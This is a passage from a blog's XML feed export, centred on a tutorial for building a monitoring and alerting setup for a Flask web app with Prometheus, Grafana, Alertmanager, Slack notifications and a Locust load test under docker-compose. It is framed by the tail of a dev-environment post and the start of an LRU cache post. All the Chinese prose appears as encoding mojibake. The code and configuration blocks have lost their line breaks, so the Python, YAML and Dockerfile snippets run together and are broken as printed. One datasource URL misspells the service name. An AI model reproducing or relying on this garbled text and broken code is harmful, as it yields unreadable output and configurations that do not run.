ç¸½çµå¦‚ä½•è¨­å®šé–‹ç™¼ç’°å¢ƒæ‡‰è©²æ˜¯æ¯å€‹åˆå­¸ç¨‹å¼è¨­è¨ˆè€…çš„ç—›ï¼ˆå¼·çƒˆå»ºè­°ä½¿ç”¨ Virtual Box è™›æ“¬æ©Ÿæ­é… Linux&#x2F;Ubuntu ç’°å¢ƒï¼‰ï¼Œä»¥ä¸Šä»‹ç´¹äº†å¦‚ä½•åœ¨ Windows æ‰“é€  Python é–‹ç™¼ç’°å¢ƒè¨­å®šï¼Œè«‹è®€è€…å‹™å¿…ç…§è‘—è‡ªå·±çš„é›»è…¦ä½œæ¥­ç³»çµ±ç’°å¢ƒå®‰è£ä¸€æ¬¡ï¼Œç•¶ç„¶è‹¥ä½ æœ‰å¿—æ–¼å¾€ç¨‹å¼è¨­è¨ˆé ˜åŸŸç™¼å±•ï¼Œä¹Ÿè¦ç†Ÿæ‚‰ä¸€ä¸‹æŒ‡ä»¤ç¢¼æ“ä½œã€‚
åƒè€ƒæ–‡ä»¶
VirtualBox 5.2å®‰è£Ubuntu 16.04
Create virtual environments for python with conda
conda vs. pip vs. virtualenv
Anacodnaä¹‹conda VS Virtualenv VS Python 3 venv å¯¹æ¯”ä½¿ç”¨æ•™ç¨‹ï¼Œåˆ›å»ºè™šæ‹Ÿç¯å¢ƒ
å‘½ä»¤åˆ—æŒ‡ä»¤ç¢¼æŸ¥è©¢

ï¼ˆimage via githubusercontentã€websiteoptimizationã€ytimgã€ytimgã€ostechnixï¼‰
é—œæ–¼ä½œè€…ï¼š@kdchang æ–‡è—å‹é–‹ç™¼è€…ï¼Œå¤¢æƒ³æ˜¯åšå‡ºäººå€‘æƒ³ç”¨çš„ç”¢å“å’Œè¾¦ä¸€æ‰€å¿ƒç›®ä¸­ç†æƒ³çš„å­¸æ ¡ã€‚A Starter &amp; Maker. JavaScript, Python &amp; Arduino&#x2F;Android lover.:) 
]]></content>
      <tags>
        <tag>Web</tag>
        <tag>Python</tag>
        <tag>ç¨‹å¼è¨­è¨ˆ</tag>
        <tag>coding</tag>
        <tag>è‡ªå­¸ç¨‹å¼è¨­è¨ˆ</tag>
        <tag>code</tag>
        <tag>Django</tag>
        <tag>MVC</tag>
        <tag>MTV</tag>
        <tag>Web Backend</tag>
        <tag>Web Framework</tag>
        <tag>æ•™å­¸</tag>
        <tag>Flask</tag>
        <tag>æ¡†æ¶</tag>
        <tag>CS</tag>
        <tag>Computer</tag>
        <tag>Computer Science</tag>
      </tags>
  </entry>
  <entry>
    <title>ä½¿ç”¨ Prometheus å’Œ Grafana æ‰“é€  Flask Web App ç›£æ§é è­¦ç³»çµ±</title>
    <url>/2019/08/26/how-to-use-prometheus-grafana-in-flask-app/</url>
    <content><![CDATA[
å‰è¨€èº«ç‚ºä¸€å€‹é–‹ç™¼è€…ï¼Œç•¶æˆ‘å€‘éƒ¨å±¬ä¸€å€‹ Web service æ™‚ï¼Œä¸æ˜¯å°„å¾Œä¸ç†ï¼Œè€Œæ˜¯éœ€è¦é€éç›£æ§é è­¦ç³»çµ±å» monitor server çš„é‹è¡Œç‹€æ³ï¼Œä¸¦åœ¨ç·Šæ€¥ç‹€æ³å³æ™‚é€šçŸ¥ç›¸é—œäººå“¡ä½œå°æ‡‰è™•ç†ã€‚æ‰€ä»¥é€éå¥½çš„ monitoring&#x2F;alert system äº†è§£ç›®å‰ server ç¡¬é«”ç³»çµ±ä½¿ç”¨ç‹€æ³ï¼ˆCPU&#x2F;Memory usageï¼‰å’Œæ•´å€‹ service çš„ç¶²è·¯ networking ç‹€æ³æ˜¯éå¸¸é‡è¦çš„ä¸€ä»¶äº‹æƒ…ã€‚è‹¥æ˜¯æœ‰ç¶“é©—çš„è®€è€…ï¼Œå¯èƒ½éå»æ›¾ç¶“ä½¿ç”¨é Zabbixã€Nagios ç­‰å·¥å…·ä¾†ç›£æ§ service çš„é‹è¡Œç‹€æ³ï¼Œä»¥ä¾¿é™¤éŒ¯å’Œç¶­æŒ service çš„å¯ç”¨æ€§ï¼ˆAvailabilityï¼‰ã€‚
åœ¨çœ¾å¤šçš„ monitor å·¥å…·ä¸­ï¼ŒPrometheus æ˜¯ä¸€å€‹å¾ˆæ–¹ä¾¿ä¸”æ•´åˆå®Œå–„çš„ç›£æ§é è­¦æ¡†æ¶ TSDBï¼ˆTime Series Databaseï¼‰æ™‚é–“åºåˆ—è³‡æ–™åº«ï¼Œå¯ä»¥å¾ˆå®¹æ˜“å»ºç«‹ä¸åŒç¶­åº¦çš„ metrics å’Œæ•´åˆä¸åŒçš„ alert tool ä»¥åŠè³‡è¨Šè¦–è¦ºåŒ–åœ–è¡¨çš„ç›£æ§å·¥å…·ä¸¦æä¾›è‡ªå¸¶çš„ PromQL (Prometheus Query Language) é€²è¡Œ query æŸ¥è©¢ã€‚æ­¤å¤–ï¼Œæºè‡ªæ–¼ SoundCloud çš„ Prometheus ç›®å‰æ˜¯ç¨ç«‹æ–¼ä»»ä½•å…¬å¸å¤–çš„ open source project ä¸¦å’Œ Kubernetes ä¸€æ¨£æ˜¯ Cloud Native Computing Foundationï¼ˆCNCFï¼‰ ä¸‹çš„ä¸€å“¡ï¼ˆç›®å‰å·²ç¶“å­µåŒ–æˆç†Ÿç•¢æ¥­äº†ï¼‰ï¼Œä¹Ÿæœ‰è¨±å¤šçŸ¥åå…¬å¸å¦‚ï¼šUberã€DigitalOcean ç­‰å°å…¥ä¼æ¥­å°ˆæ¡ˆï¼Œæ‰€ä»¥åœ¨ä½¿ç”¨ä¸Šç›¸å°æœ‰ä¿éšœã€‚
ä»Šå¤©æˆ‘å€‘å°±è¦é€é docker compose æ­é… flask å¯¦ä½œä¸€å€‹ç°¡å–® web service ç¯„ä¾‹ï¼Œä¾†æ•´åˆ Prometheus å’Œ Grafana ä¾†å»ºç«‹ä¸€å€‹ web service ç›£æ§é è­¦ç³»çµ±ã€‚
Prometheus ä»‹ç´¹
ç°¡å–®ä¾†èªª Prometheus æ˜¯ä¸€å€‹ç›£æ§é è­¦æ¡†æ¶å’Œ TSDBï¼ˆTime Series Databaseï¼‰æ™‚é–“åºåˆ—è³‡æ–™åº«ï¼Œå¯ä»¥å¾ˆå®¹æ˜“å»ºç«‹ä¸åŒç¶­åº¦ï¼ˆdimensionï¼‰çš„ metrics å’Œæ•´åˆä¸åŒçš„ alert tool ä»¥åŠè³‡è¨Šè¦–è¦ºåŒ–çš„ç›£æ§å·¥å…·ã€‚é€é Prometheus æˆ‘å€‘å¯ä»¥å»ºç«‹ä¸€ç«™å¼çš„ç›£æ§é è­¦ç³»çµ±ã€‚Prometheus å¯èƒ½åœ¨å„²å­˜æ“´å±•ä¸Šæ¯”ä¸ä¸Šå…¶ä»– Time Series Databaseï¼Œä½†åœ¨æ•´åˆå„ç¨®ç¬¬ä¸‰æ–¹çš„ data source ä¸Šååˆ†æ–¹ä¾¿ï¼ˆç®—æ˜¯ä¸€å€‹æ‡¶äººåŒ…ï¼‰ï¼Œä¸”åœ¨æ”¯æ´é›²ç«¯æœå‹™å’Œ container å®¹å™¨ç›¸é—œå·¥å…·éƒ½ååˆ†å‹å¥½ã€‚ç„¶è€Œåœ¨åœ–è¡¨é¡¯ç¾ä¸Šå°±ç¨å«Œå–®è–„ï¼Œæ‰€ä»¥é€šå¸¸æœƒæ­é…ç²¾ç¾çš„å„€è¡¨æ¿å·¥å…· Grafana ç­‰ä¾†é€²è¡Œè³‡è¨Šè¦–è¦ºåŒ–å’Œåœ–è¡¨å‘ˆç¾ã€‚

ä¿—è©±èªªï¼Œä¸€å¼µåœ–å‹éåƒè¨€è¬èªï¼šæ¥ä¸‹ä¾†æˆ‘å€‘ç”¨æ¶æ§‹åœ–å°±å¯ä»¥æ›´æ¸…æ¥šäº†è§£ Prometheus æ•´é«”çš„æ¶æ§‹å’Œå®šä½ï¼š

æœ‰å€‹ Prometheus server æœ¬é«”ï¼Œæœƒå» Prometheus client pull ç›¸é—œ metricsï¼Œè‹¥æ˜¯çŸ­æœŸçš„ job ä¾‹å¦‚ cronjob åœ¨é‚„ä¾†ä¸åŠ pull è³‡æ–™å›ä¾†å¯èƒ½å°±å·²ç¶“å®Œæˆä»»å‹™ï¼Œæ¸…æ´—æ‰è³‡æ–™ã€‚æ‰€ä»¥æœƒæœ‰ä¸€å€‹ pushgateway æ¥æ”¶ job push éä¾†çš„ç›¸é—œè³‡è¨Šï¼ŒPrometheus server å†å¾å…¶ä¸­æ‹‰å–è³‡æ–™ï¼ˆå°±æ˜¯ gateway çš„æ„Ÿè¦ºï¼‰
ä¸Šé¢éƒ¨åˆ†å‰‡é€é Service discovery çš„æ–¹å¼å¯ä»¥å¾ˆå¥½çš„è’é›† kubernetes ç›¸é—œçš„è³‡è¨Š
Prometheus æœ¬é«”æœƒå°‡è³‡æ–™å„²å­˜åœ¨ local on-disk time series database æˆ–æ˜¯å¯ä»¥ä¸²æ¥ remote storage systems
Prometheus server è³‡æ–™æ‹‰å›ä¾†å¾Œå¯ä»¥æä¾›æœ¬èº«è‡ªå¸¶çš„ Web UI æˆ– Grafana å’Œå…¶ä»– client ä¾†å‘ˆç¾ï¼ˆé€éä½¿ç”¨ PromQL é€²è¡ŒæŸ¥è©¢ï¼‰
ç•¶æŠ“å–è³‡æ–™çš„å€¼è¶…é alert rule æ‰€è¨­å®šçš„é–¥å€¼ï¼ˆthresholdï¼‰ æ™‚ï¼Œ alert manager å°±æœƒå°‡è¨Šæ¯é€å‡ºï¼ˆå¯ä»¥é€é Emailã€Slackã€pagerduty ç­‰è¨Šæ¯é€šçŸ¥ï¼‰ï¼Œæé†’ç›¸é—œäººå“¡æ³¨æ„

å¦å¤– Prometheus æ›´å¤šå¼·åŒ–æ¨¡çµ„ç¤™æ–¼ç¯‡å¹…ä¸‹æ¬¡å†è¨è«–ï¼š

Node exporterï¼šè’é›†ä½œæ¥­ç³»çµ±ï¼ˆOSï¼‰å’Œç¡¬é«”ï¼ˆhardwareï¼‰ç›¸é—œè³‡æ–™
cAdvisorï¼šè’é›†å®¹å™¨ï¼ˆcontainerï¼‰ç›¸é—œè³‡æ–™

æœ€å¾Œï¼Œæˆ‘å€‘è¦äº†è§£çš„æ˜¯ Prometheus Client å‡½å¼åº«æ”¯æ´äº†å››ç¨®ä¸»è¦ Metric çš„é¡å‹ï¼š

Counter: ç´¯åŠ çš„è³‡æ–™ï¼Œé‡è¨­å€¼ç‚º 0ã€‚å¸¸ç”¨æ–¼ HTTP request éŒ¯èª¤çš„å‡ºç¾æ¬¡æ•¸æˆ–æ˜¯ error exception å‡ºç¾æ¬¡æ•¸
Gauge: å±¬æ–¼èˆ‡æ™‚é–“ç„¡é—œçš„ç•¶ä¸‹è³‡æ–™ï¼ˆå¯ä»¥å¢æ¸›ï¼‰ï¼Œä¾‹å¦‚ï¼šCPU&#x2F;Memory ä½¿ç”¨é‡
Histogram: ä¸»è¦ä½¿ç”¨åœ¨è¡¨ç¤ºä¸€æ®µæ™‚é–“ç¯„åœå…§çš„è³‡æ–™è’é›†ï¼Œä»¥é•·æ¢åœ–å‘ˆç¾
Summaryï¼š è¡¨ç¤ºä¸€æ®µæ™‚é–“å…§çš„è³‡æ–™è’é›†çš„ç¸½çµ

ä»¥ä¸Šå°±æ˜¯ Promethus æ¶æ§‹çš„ä¸€å€‹æ¦‚è¦½ï¼Œç›¸ä¿¡è®€è€…å€‘å°æ–¼ Promethus å·²ç¶“æœ‰å€‹åˆæ­¥èªè­˜ï¼ŒçŸ¥é“ Promethus æ˜¯ä¸€å€‹ç›£æ§é è­¦æ¡†æ¶å’Œ TSDBï¼ˆTime Series Databaseï¼‰æ™‚é–“åºåˆ—è³‡æ–™åº«ï¼Œæ¥ä¸‹ä¾†æˆ‘å€‘ä»‹ç´¹ Grafana çš„éƒ¨åˆ†ã€‚
Grafana ä»‹ç´¹
Grafana æ˜¯ç”± Grafana Lab ç¶“ç‡Ÿçš„ä¸€å€‹éå¸¸ç²¾ç¾çš„å„€è¡¨æ¿ dashboard ç³»çµ±ï¼Œå¯ä»¥æ•´åˆå„ç¨®ä¸åŒçš„ datasourceï¼Œä¾‹å¦‚ï¼šPromethusã€Elasticsearchã€MySQLã€PostgreSQL ç­‰ã€‚é€éä¸åŒç¨® metric å‘ˆç¾åœ¨ dashboard ä¸Šã€‚åœ¨é€™è£¡æˆ‘å€‘ä¸»è¦èšç„¦åœ¨å’Œ Promethus å’Œ Grafana çš„æ•´åˆä¸Šã€‚
å°ˆé¡Œæ™‚é–“ï¼šé€é docker-compose é‹è¡Œ Prometheus&#x2F;Grafana ç›£æ§ Flask Web Appæ¥è‘—æˆ‘å€‘è¦é€é docker å’Œ docker-compose å•Ÿå‹•ä¸€å€‹ç°¡å–® Python Flask Web Server ä¸¦ä½¿ç”¨ Prometheus å’Œ Grafana ç•¶ä½œå…¶ç›£æ§é è­¦ç³»çµ±ï¼Œæœ€å¾Œæˆ‘å€‘æœƒå‘ˆç¾çš„æ˜¯ä¸€å€‹ Prometheus å’Œ Grafana dashbaord ä»¥åŠæˆ‘å€‘æœƒä½¿ç”¨ locust ç›´æ¥æ¨¡æ“¬å¤§é‡ request å»è§¸ç™¼é è­¦ç³»çµ±é€é€šçŸ¥åˆ° slackï¼ï¼ˆè‹¥æ˜¯å°æ–¼ docker&#x2F;docker compose æˆ– locust æ¯”è¼ƒä¸ç†Ÿæ‚‰çš„è®€è€…å¯ä»¥åƒè€ƒç­†è€…ä¹‹å‰æ’°å¯«çš„ç›¸é—œæ–‡ç« ï¼šDocker Compose å»ºç½® Web service èµ·æ­¥èµ°å…¥é–€æ•™å­¸ å’Œ å¦‚ä½•ä½¿ç”¨ Python å’Œ Locust é€²è¡Œ Load testing å…¥é–€æ•™å­¸
ï¼‰ã€‚
å»ºç«‹ Flask Web App
é€é docker&#x2F;docker-compose å»ºç«‹ Web App
 æˆ‘å€‘é€™é‚Šä½¿ç”¨ä¸€å€‹ flask web app ç•¶ä½œæ¸¬è©¦ï¼Œä¹Ÿå°±æ˜¯ä¸€å€‹è®“ prometheus_server pull è³‡æ–™å›å»çš„ serverã€‚
 é¦–å…ˆå…ˆå®‰è£ç›¸é—œå¥—ä»¶ï¼Œå»ºç«‹ requirements.txt æª”æ¡ˆï¼š
 flaskprometheus_clientlocustio

 ä»¥ä¸‹æ˜¯ Dockerfileï¼š
 FROM python:3.6-alpineADD . /codeWORKDIR /codeRUN pip install -r requirements.txtCMD [&quot;python&quot;, &quot;app.py&quot;]

 é€™é‚Šä½¿ç”¨ä¸€å€‹ç°¡å–®çš„ flask app ä¾†ç•¶ä½œæ¸¬è©¦ï¼ˆapp.pyï¼‰ï¼Œä¸»è¦æ˜¯æä¾›ä¸€å€‹ endpoint /ï¼Œä¸¦ä½¿ç”¨ prometheus_client ä¸­ counter metricï¼Œç•¶æœ‰ä½¿ç”¨è€…æ‰“ endpointï¼Œå‰‡ç´¯åŠ ç´€éŒ„ä¸€æ¬¡ã€‚è€Œ /metrics endpoint å‰‡ export äº† flask app server çš„è³‡è¨Šï¼Œæä¾› prometheus_server ä¾† pull ç›¸é—œè³‡æ–™å›å»ã€‚ï¼ˆé€™è£¡ç‚ºæ±‚ç°¡åŒ–æµç¨‹æ‰€ä»¥åªä½¿ç”¨ Counterï¼Œè®€è€…å¯ä»¥è‡ªå·±å˜—è©¦æ–°å¢ Gaugeã€Histogramã€Summary ç­‰ metric é¡å‹ï¼‰
 import prometheus_clientfrom prometheus_client import Counterfrom flask import Response, Flask, jsonifyapp = Flask(__name__)total_requests = Counter(&#x27;request_count&#x27;, &#x27;Total webapp request count&#x27;)@app.route(&#x27;/metrics&#x27;)def requests_count():    total_requests.inc()    return Response(prometheus_client.generate_latest(total_requests), mimetype=&#x27;text/plain&#x27;)@app.route(&#x27;/&#x27;)def index():    total_requests.inc()    return jsonify(&#123;        &#x27;status&#x27;: &#x27;ok&#x27;    &#125;)if __name__ == &#x27;__main__&#x27;:    app.run(host=&#x27;0.0.0.0&#x27;, port=5000)

 åœ¨ docker-compose.yaml è¿½åŠ  flask appï¼ˆé€é Dockerfile å•Ÿå‹•ï¼Œport åœ¨ 5000ï¼‰
 version: &#x27;3.7&#x27;services:    web:        build: .        ports:        - &quot;5000:5000&quot;        volumes:        - .:/code # æŠŠç•¶å‰è³‡æ–™å¤¾ mount æ›è¼‰é€²å» containerï¼Œé€™æ¨£ä½ å¯ä»¥ç›´æ¥åœ¨æœ¬åœ°ç«¯å°ˆæ¡ˆè³‡æ–™å¤¾æ”¹å‹•æª”æ¡ˆï¼Œcontainer è£¡é¢çš„æª”æ¡ˆä¹Ÿæœƒæ›´å‹•ä¹Ÿä¸ç”¨é‡æ–° build imageï¼

 æ¥è‘—åœ¨çµ‚ç«¯æ©Ÿé€é docker-compose up å°±å¯ä»¥å•Ÿå‹• flask web app åœ¨ localhost:5000 å›‰ï¼


è¨­å®š Promethus
åœ¨è³‡æ–™å¤¾ä¸‹å»ºç«‹è¨­å®šæª”æ¡ˆï¼šprometheus.yaml
 # è¨­å®š global å…¨åŸŸè¨­å®š# scrape_interval æ˜¯å¤šä¹…æŠ“å–ä¸€æ¬¡è³‡æ–™global:    scrape_interval: 5s    external_labels:        monitor: &#x27;demo-monitor&#x27;# scrape_configs å‰‡æ˜¯æŠ“å–ä¾†æºï¼Œé€™é‚Šå…ˆè¨­å®šæˆ‘å€‘ prometheus æœ¬é«” server å’Œ flask api_monitorï¼Œdocker-compose æœƒæŠŠ service åŠ å…¥ default network æ‰€ä»¥å¯ä»¥ç”¨ web:5000 æ‰¾åˆ° flask app web servicescrape_configs:    - job_name: &#x27;prometheus&#x27;    static_configs:        - targets: [&#x27;localhost:9090&#x27;]    - job_name: &#x27;api_monitor&#x27;    scrape_interval: 5s    static_configs:        - targets: [&#x27;web:5000&#x27;]

é€é docker&#x2F;docker-compose å®‰è£ Prometheus
 version: &#x27;3.7&#x27;volumes:    prometheus_data: &#123;&#125;    grafana_data: &#123;&#125;services:  prometheus:    image: prom/prometheus:v2.1.0    volumes:      - ./prometheus.yaml:/etc/prometheus/prometheus.yaml    command:      - &#x27;--config.file=/etc/prometheus/prometheus.yaml&#x27;    ports:      - &#x27;9090:9090&#x27;

åœ¨çµ‚ç«¯æ©Ÿä½¿ç”¨ $ docker-compose up å•Ÿå‹• Prometheus

è§€çœ‹ promethus web UI dashboard
 

è§€çœ‹ promethus metrics
 Prometheus metric å‘ˆç¾æ ¼å¼ï¼š
 &lt;metric name&gt;&#123;&lt;label name&gt;=&lt;label value&gt;, ...&#125;

 

è§€çœ‹ flask app metrics
 


åˆ°é€™é‚Šæ­å–œè®€è€…å·²ç¶“å®Œæˆ Promethus çš„åˆå§‹è¨­å®šä¸¦æ“æœ‰ä¸€å€‹ Promethus Service äº†ï¼Œæ¥ä¸‹ä¾†æˆ‘å€‘è¦æŠŠè³‡æ–™ä¸²æ¥åˆ° Grafana è®“è³‡æ–™å¯ä»¥é€é dashboard å‘ˆç¾ã€‚
è¨­å®š Grafana
é€é docker-compose å®‰è£ Grafana
 grafana:    image: grafana/grafana    volumes:        - grafana_data:/var/lib/grafana    environment:      - GF_SECURITY_ADMIN_PASSWORD=pass    depends_on:      - prometheus    ports:      - &#x27;3000:3000&#x27;

ä¸²æ¥ promethus datasource åˆ° grafana ä¸Šï¼ˆç™»å…¥å¸³è™Ÿç‚º admin&#x2F;passï¼‰
 
 é¦–å…ˆæˆ‘å€‘å…ˆé¸æ“‡ Add data sourceï¼Œå¯ä»¥çœ‹åˆ°æœ‰å¾ˆå¤šä¸åŒçš„è³‡æ–™ä¾†æºå¯ä»¥ä¸²æ¥ï¼š
 
 
 æˆ‘å€‘é¸æ“‡ä¸²æ¥ Promethus ç‚º datasourceï¼Œä¸¦åœ¨ä¸²æ¥ url è¼¸å…¥ http://promethus:9090ï¼ˆé€é promethus docker compose æœƒå¹«æˆ‘å€‘æ‰¾åˆ°å°æ‡‰ ipï¼‰ï¼Œå°±å¯ä»¥æ‰¾åˆ° Promethus çš„ metrics è³‡æ–™ã€‚
 
 ç”±æ–¼ Promethus æ˜¯ä½¿ç”¨ PromQL è®€å–è³‡æ–™ï¼Œæ‰€ä»¥ä¸€é–‹å§‹ä¸ç†Ÿæ‚‰çš„è©±å¯ä»¥å…ˆæŠŠé è¨­çš„ dashboard çµ¦ import é€²ä¾†ï¼Œåœ¨ dashboard å°±å¯ä»¥çœ‹åˆ°é è¨­ dashboardï¼Œå¯ä»¥é¸æ“‡ dashboard ä¸Šçš„ edit åƒè€ƒç›¸é—œèªæ³•
 
 å›åˆ°å°±å¯ä»¥çœ‹åˆ° Promethus 2.0 Stats ç­‰åœ–è¡¨å¯ä»¥è§€çœ‹ï¼š
 
 ä½†æˆ‘å€‘æƒ³çœ‹çš„æ˜¯æˆ‘å€‘ Flask Web App çš„ Counter æ¬¡æ•¸ï¼Œæ‰€ä»¥æˆ‘å€‘å¯ä»¥é»é¸å·¦æ–¹é¸å–®çš„ + è™Ÿï¼Œæ‰‹å‹•æ–°å¢åœ–è¡¨ dashbaordï¼ˆé¸æ“‡ Add Queryï¼‰ï¼Œé€é Query ä¸‹æ‹‰å¼é¸å–®é¸æ“‡ Promethus ç„¶å¾Œ Metrics ä¸‹æ‹‰é¸ request -&gt; request_count_toal å°±å¯ä»¥çœ‹åˆ° flask web app è¢« request æ¬¡æ•¸ã€‚æ­¤æ™‚å¯ä»¥æ‰‹å‹•é‡æ–°æ•´ç†å¤šæ¬¡ flask web app é é¢å°±å¯ä»¥çœ‹åˆ°çµ±è¨ˆè³‡æ–™æŒçºŒå¾€ä¸Šã€‚æ¥ä¸‹ä¾†æˆ‘å€‘æœƒä½¿ç”¨ locust ç›´æ¥æ¨¡æ“¬å¤§é‡ request å»è§¸ç™¼é è­¦ç³»çµ±é€é€šçŸ¥åˆ° slackï¼
 
 
 æ›´å¤šåœ–è¡¨ï¼Œè®€è€…è‹¥æœ‰èˆˆè¶£å¯ä»¥ç¹¼çºŒæ¢ç´¢ï¼š
 
 


è¨­å®š Alert manager
é€é docker-compose å®‰è£ Alert manager åœ¨ docker-compose è¿½åŠ  alertmanager ç›¸é—œè¨­å®šï¼Œä¹Ÿè¨˜å¾—ä¹Ÿè¦æŠŠé€™æ®µ - ./alert_rules.yaml:/etc/prometheus/alert_rules.yaml æ”¾åˆ° prometheus service çš„ volumes ä¸­
 alertmanager:  image: prom/alertmanager  ports:    - 9093:9093  volumes:    - ./alertmanager.yaml/:/etc/alertmanager/alertmanager.yaml  restart: always  command:    - &#x27;--config.file=/etc/alertmanager/alertmanager.yaml&#x27;    - &#x27;--storage.path=/alertmanager&#x27;

 è¨­å®š slack å–å¾— YOUR_SLACK_WEBHOOK_URL
 
 

æ–°å¢ alert_rules.yaml æª”æ¡ˆæ–¼è³‡æ–™å¤¾ä¸‹ï¼Œå®šç¾©è¦å‰‡ï¼ˆrequest_count_total &gt; 100 æŒçºŒè¶…é 10s å°±æº–å‚™ç™¼å‡º alert é€åˆ° slackï¼‰ï¼š
groups:    - name: too_many_request_count_total      rules:      - alert: TooManyReq        expr: request_count_total &gt; 100        for: 10s        labels:          user: test        annotations:          summary: &quot;request_count_total is too over!&quot;          description: &quot;&#123;&#123; $labels.instance &#125;&#125; of job &#123;&#123; $labels.job &#125;&#125; has over 100 for more than 1 sec.&quot;          username: &quot;@channel&quot;

æ–°å¢è¨­å®š alertmanager.yaml æ–¼è³‡æ–™å¤¾ä¸‹ï¼ŒæŒ‡å®šè¨Šæ¯å‚³é€æ–¹å¼ï¼ˆå¯ä»¥æ˜¯é€ emailã€slack ç­‰æ–¹å¼ï¼Œé€™é‚Šä½¿ç”¨ slackï¼Œè¨˜å¾—å…ˆå» slack é–‹ç”³è«‹ install app åˆ°å°æ‡‰ channelï¼Œç„¶å¾Œå–å¾— YOUR_SLACK_WEBHOOK_URLï¼‰
 global:  resolve_timeout: 2hroute:  group_by: [&#x27;alertname&#x27;]  group_wait: 5s  group_interval: 10s  repeat_interval: 1h  receiver: &#x27;slack&#x27;receivers:  - name: &#x27;slack&#x27;    slack_configs:      - api_url: &quot;YOUR_SLACK_WEBHOOK_URL&quot;        channel: &quot;#alert-test&quot;        text: &quot;Alert!&quot;        title: &quot;&#123;&#123;.CommonAnnotations.summary&#125;&#125;&quot;

 é‡å•Ÿ docker-compose ç„¶å¾Œå›åˆ° Prometheus dashboard å¯ä»¥çœ‹åˆ° alert è¦å‰‡å·²ç¶“è¨­å®šå®Œæˆï¼š
 


å®Œæ•´ç¨‹å¼ç¢¼ docker-compose.yamlversion: &#x27;3.7&#x27;volumes:    prometheus_data: &#123;&#125;    grafana_data: &#123;&#125;services:  prometheus:    image: prom/prometheus:v2.1.0    volumes:      - ./prometheus.yaml:/etc/prometheus/prometheus.yaml      - ./alert_rules.yaml:/etc/prometheus/alert_rules.yaml    command:      - &#x27;--config.file=/etc/prometheus/prometheus.yaml&#x27;    ports:      - &#x27;9090:9090&#x27;  grafana:    image: grafana/grafana    volumes:        - grafana_data:/var/lib/grafana    environment:      - GF_SECURITY_ADMIN_PASSWORD=pass    depends_on:      - prometheus    ports:      - &#x27;3000:3000&#x27;  web:    build: .    ports:      - &quot;5000:5000&quot;    volumes:      - .:/code    depends_on:      - prometheus  alertmanager:    image: prom/alertmanager    ports:      - 9093:9093    volumes:      - ./alertmanager.yaml/:/etc/alertmanager/alertmanager.yaml    restart: always    command:      - &#x27;--config.file=/etc/alertmanager/alertmanager.yaml&#x27;      - &#x27;--storage.path=/alertmanager&#x27;

Alert Manager æ¸¬è©¦é€™é‚Šæˆ‘å€‘åƒè€ƒ å¦‚ä½•ä½¿ç”¨ Python å’Œ Locust é€²è¡Œ Load testing å…¥é–€æ•™å­¸ ä¾†é€å‡ºæ¸¬è©¦ requestï¼Œè®“ request count å¿«é€Ÿå¢åŠ é”åˆ° alert çš„é–€æª»ã€‚
æ’°å¯« locustfile.py
from locust import HttpLocust, TaskSet, taskclass WebsiteTasks(TaskSet):    @task(1)    def index(self):        self.client.get(&#x27;/&#x27;)class WebsiteUser(HttpLocust):    task_set = WebsiteTasks    min_wait = 5000    max_wait = 15000

åœ¨çµ‚ç«¯æ©Ÿ terminal å€¼è¡Œä»¥ä¸‹æŒ‡ä»¤ï¼Œæ¨¡æ“¬ä¸æ–·ç™¼å‡ºå¤§é‡ requestï¼š
$ locust -f locustfile.py -H http://localhost:5000 --no-web -c 100 -r 10 -t 600s

çœ‹åˆ°æ•¸å€¼å·²è¶…éé–¥å€¼ï¼š

ç­‰å¾…ä¸­ï¼š

ç™¼é€é€šçŸ¥ï¼š

å¯ä»¥çœ‹åˆ° grafana ä¸Š request_count metric åœ–è¡¨ä¸æ–·å¢åŠ ï¼Œpromethus çš„ alert æœ€å¾Œä¹ŸéŸ¿èµ·ï¼Œç™¼é€è¨Šæ¯åˆ° slack ä¸Šï¼

ç¸½çµä»¥ä¸Šæˆ‘å€‘æ•´åˆäº† Promethusï¼ˆè² è²¬è’é›†è³‡æ–™å’Œé è­¦ï¼‰å’Œ Grafanaï¼ˆè² è²¬è¦–è¦ºåŒ–è³‡æ–™ï¼‰æˆåŠŸç‚ºæˆ‘å€‘çš„ Python Flask App æ‰“é€ äº†ç›£æ§é è­¦ç³»çµ±ä¸¦ç™¼é€è¨Šæ¯åˆ° slack ä¸Šã€‚æœªä¾†ç•¶ service ç™¼ç”Ÿå•é¡Œæ™‚ï¼Œå°±å¯ä»¥åœ¨ç¬¬ä¸€æ™‚é–“æé†’å€¼ç­çš„å·¥ç¨‹å¸«ï¼Œæº–å‚™ä¸Šç­å›‰ï¼äº‹å¯¦ä¸Šï¼ŒPromethus å’Œ Grafana æœ‰è »å¤šæ›´é€²éšçš„ä¸»é¡Œå€¼å¾—æŒçºŒæ¢ç´¢ï¼Œä¾‹å¦‚å¦‚ä½•å’Œ Kubernetesï¼ˆk8sï¼‰çš„æ•´åˆã€ç¡¬é«”æ•ˆèƒ½ç›£æ§å’Œè©•ä¼°ã€AIOpsï¼ˆäººå·¥æ™ºæ…§é‹ç¶­ï¼‰ç­‰ï¼Œæœªä¾†æœ‰æ©Ÿæœƒå†å’Œå¤§å®¶ç¹¼çºŒåˆ†äº«ï¼
åƒè€ƒæ–‡ä»¶
prometheus installation
Grafana Dashboard for Prometheus official Python client with Flask App metrics
Using Prometheus in Grafana
Flask application monitoring with Prometheus

ï¼ˆimage via aptiraï¼‰
é—œæ–¼ä½œè€…@kdchang æ–‡è—å‹é–‹ç™¼è€…ï¼Œå¤¢æƒ³æ˜¯åšå‡ºäººå€‘æƒ³ç”¨çš„ç”¢å“å’Œè¾¦ä¸€æ‰€å¿ƒç›®ä¸­ç†æƒ³çš„å­¸æ ¡ã€‚A Starter &amp; Maker. JavaScript, Python &amp; Arduino&#x2F;Android lover.:) 
]]></content>
      <tags>
        <tag>Python</tag>
        <tag>tutorial</tag>
        <tag>Flask</tag>
        <tag>Prometheus</tag>
        <tag>Grafana</tag>
        <tag>Alertmanager</tag>
        <tag>docker-compose</tag>
        <tag>slack</tag>
        <tag>monitor</tag>
        <tag>monitoring system</tag>
        <tag>pagerduty</tag>
        <tag>alert system</tag>
        <tag>Cloud Native</tag>
        <tag>Grafana æ•™å­¸</tag>
        <tag>Prometheus æ•™å­¸</tag>
      </tags>
  </entry>
  <entry>
    <title>å¦‚ä½•ä½¿ç”¨ Python å¯¦ç¾ LRU Cache å¿«å–ç½®æ›æ©Ÿåˆ¶</title>
    <url>/2019/04/06/how-to-use-python-implement-least-recently-used/</url>
    <content><![CDATA[
